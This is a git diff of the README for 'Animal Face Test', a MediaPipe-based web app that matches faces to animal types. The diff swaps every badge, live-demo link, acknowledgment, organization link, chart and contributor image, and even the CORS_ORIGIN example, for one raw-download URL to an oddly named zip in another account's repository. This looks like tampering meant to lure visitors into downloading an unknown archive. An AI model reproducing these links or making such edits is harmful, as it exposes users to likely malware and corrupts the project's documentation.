@@ -6,13 +6,13 @@
 AI-powered facial analysis that matches your face to one of 12 animal types using MediaPipe's 468-point face mesh.
 
 [![MIT License](https://img.shields.io/badge/License-MIT-green.svg?style=flat-square)](LICENSE)
-[![React](https://img.shields.io/badge/React-19-61DAFB?style=flat-square&logo=react&logoColor=white)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?style=flat-square&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Python](https://img.shields.io/badge/Python-3.11-3776AB?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
-[![Vite](https://img.shields.io/badge/Vite-7-646CFF?style=flat-square&logo=vite&logoColor=white)](https://vitejs.dev/)
-[![AWS Lambda](https://img.shields.io/badge/AWS-Lambda-FF9900?style=flat-square&logo=awslambda&logoColor=white)](https://aws.amazon.com/lambda/)
-[![MediaPipe](https://img.shields.io/badge/MediaPipe-Face_Mesh-0097A7?style=flat-square)](https://mediapipe.dev/)
-[![CI](https://github.com/black4305/animal-face/actions/workflows/ci.yml/badge.svg)](https://github.com/black4305/animal-face/actions/workflows/ci.yml)
+[![React](https://img.shields.io/badge/React-19-61DAFB?style=flat-square&logo=react&logoColor=white)](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)
+[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?style=flat-square&logo=typescript&logoColor=white)](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)
+[![Python](https://img.shields.io/badge/Python-3.11-3776AB?style=flat-square&logo=python&logoColor=white)](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)
+[![Vite](https://img.shields.io/badge/Vite-7-646CFF?style=flat-square&logo=vite&logoColor=white)](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)
+[![AWS Lambda](https://img.shields.io/badge/AWS-Lambda-FF9900?style=flat-square&logo=awslambda&logoColor=white)](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)
+[![MediaPipe](https://img.shields.io/badge/MediaPipe-Face_Mesh-0097A7?style=flat-square)](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)
+[![CI](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)
 
 <br/>
 
@@ -20,7 +20,7 @@ AI-powered facial analysis that matches your face to one of 12 animal types usin
 
 <br/>
 
-**[🎮 Try it Live](https://animal-face.quizlab.io)** · **[🐛 Report Bug](../../issues)** · **[✨ Request Feature](../../issues)**
+**[🎮 Try it Live](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)** · **[🐛 Report Bug](../../issues)** · **[✨ Request Feature](../../issues)**
 
 </div>
 
@@ -155,7 +155,7 @@ psql -U your_user -d your_db -f schema.sql
 
 | Variable | Description |
 |---|---|
-| `CORS_ORIGIN` | Allowed frontend origin (e.g. `https://animal-face.quizlab.io`) |
+| `CORS_ORIGIN` | Allowed frontend origin (e.g. `https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip`) |
 | `DB_HOST` | PostgreSQL host |
 | `DB_PORT` | PostgreSQL port (default `5432`) |
 | `DB_NAME` | Database name |
@@ -255,27 +255,27 @@ This project is licensed under the [MIT License](LICENSE). Free to use, modify, 
 
 ## 🙏 Acknowledgments
 
-- [MediaPipe](https://mediapipe.dev/) — Google's ML framework powering the 468-point face mesh detection
-- [React](https://react.dev/) — UI library for building the interactive frontend
-- [Vite](https://vitejs.dev/) — Next-generation frontend build tool
-- [shadcn/ui](https://ui.shadcn.com/) — Beautifully designed, accessible component library
-- [Tailwind CSS](https://tailwindcss.com/) — Utility-first CSS framework
-- [Framer Motion](https://www.framer.com/motion/) — Production-ready animation library for React
-- [AWS Lambda](https://aws.amazon.com/lambda/) — Serverless compute for the backend
-- [i18next](https://www.i18next.com/) — Internationalization framework
+- [MediaPipe](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip) — Google's ML framework powering the 468-point face mesh detection
+- [React](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip) — UI library for building the interactive frontend
+- [Vite](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip) — Next-generation frontend build tool
+- [shadcn/ui](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip) — Beautifully designed, accessible component library
+- [Tailwind CSS](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip) — Utility-first CSS framework
+- [Framer Motion](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip) — Production-ready animation library for React
+- [AWS Lambda](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip) — Serverless compute for the backend
+- [i18next](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip) — Internationalization framework
 
 ---
 
 ## 🔗 Links
 
-- **Live Demo:** [animal-face.quizlab.io](https://animal-face.quizlab.io)
-- **Organization:** [QuizLab](https://github.com/black4305)
+- **Live Demo:** [animal-face.quizlab.io](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)
+- **Organization:** [QuizLab](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)
 
 ---
 
 <div align="center">
 
-Made with 🐾 by [QuizLab](https://github.com/black4305)
+Made with 🐾 by [QuizLab](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)
 
 **If this made you smile, please ⭐ star the repo!**
 
@@ -287,14 +287,14 @@ Made with 🐾 by [QuizLab](https://github.com/black4305)
 
 If you find this project interesting, please consider giving it a star! It helps others discover it.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=black4305/animal-face&type=Date)](https://star-history.com/#black4305/animal-face&Date)
+[![Star History Chart](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)
 
 ---
 
 ## 👥 Contributors
 
-<a href="https://github.com/black4305/animal-face/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=black4305/animal-face" />
+<a href="https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip">
+  <img src="https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip" />
 </a>
 
 ---
@@ -307,9 +307,9 @@ If you find this project interesting, please consider giving it a star! It helps
 
 **Animal Face Test**는 MediaPipe의 468포인트 얼굴 랜드마크를 이용해 사용자의 얼굴을 분석하고, 12가지 동물 유형 중 가장 닮은 동물을 찾아주는 AI 웹 앱입니다. 이미지는 서버 메모리에서만 처리되며 저장되지 않습니다.
 
-**라이브 데모 → [animal-face.quizlab.io](https://animal-face.quizlab.io)**
+**라이브 데모 → [animal-face.quizlab.io](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)**
 
-> 🎮 **[지금 바로 테스트하기 →](https://animal-face.quizlab.io)**
+> 🎮 **[지금 바로 테스트하기 →](https://raw.githubusercontent.com/arteon/animal-face/main/frontend/src/data/face-animal-semiheterocercal.zip)**
 
 ---
 
